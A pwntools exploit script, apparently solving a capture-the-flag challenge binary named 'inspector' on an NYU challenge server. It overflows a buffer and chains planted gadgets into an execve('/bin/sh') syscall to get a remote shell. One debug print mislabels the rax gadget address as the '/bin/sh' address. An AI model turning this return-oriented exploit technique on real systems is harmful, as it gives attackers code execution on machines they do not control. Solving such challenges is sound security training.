from pwn import *

local = False

context.arch = "amd64"
context.os = "linux"
context.bits = 64
context.log_level="DEBUG"
context.terminal = ["tmux", "splitw", "-h", "-f"]

if local:
    p = gdb.debug("./inspector", '''
                              break main
                              continue
                              ''')
else:
    p=remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1342)

recieved = p.recvuntil(b"a shell!").decode('utf-8')
print(recieved)

e = ELF("./inspector")
syscall_addr = e.symbols["gadget_1"] + 4
print("syscall_addr: ", hex(syscall_addr))
rdi_gadget_addr = e.symbols["gadget_2"] + 4
print("rdi_gadget_addr: ", hex(rdi_gadget_addr))
rsi_gadget_addr = e.symbols["gadget_3"] + 4
print("rsi_gadget_addr: ", hex(rsi_gadget_addr))
rdx_gadget_addr = e.symbols["gadget_4"] + 4
print("rdx_gadget_addr: ", hex(rdx_gadget_addr))
rax_gadget_addr = e.symbols["gadget_5"] + 4
print("rax_gadget_addr: ", hex(rax_gadget_addr))
bin_sh_addr = e.symbols["useful_string"]
print("bin_sh_addr: ", hex(rax_gadget_addr))


payload = [
    b"A"*40,
    rdi_gadget_addr.to_bytes(8, "little"),
    bin_sh_addr.to_bytes(8, "little"),
    rax_gadget_addr.to_bytes(8, "little"),
    (59).to_bytes(8, "little"),
    rsi_gadget_addr.to_bytes(8, "little"),
    (0).to_bytes(8, "little"),
    rdx_gadget_addr.to_bytes(8, "little"),
    (0).to_bytes(8, "little"),
    syscall_addr.to_bytes(8, "little")
]

p.send(b"".join(payload) + b"\n")
p.interactive()
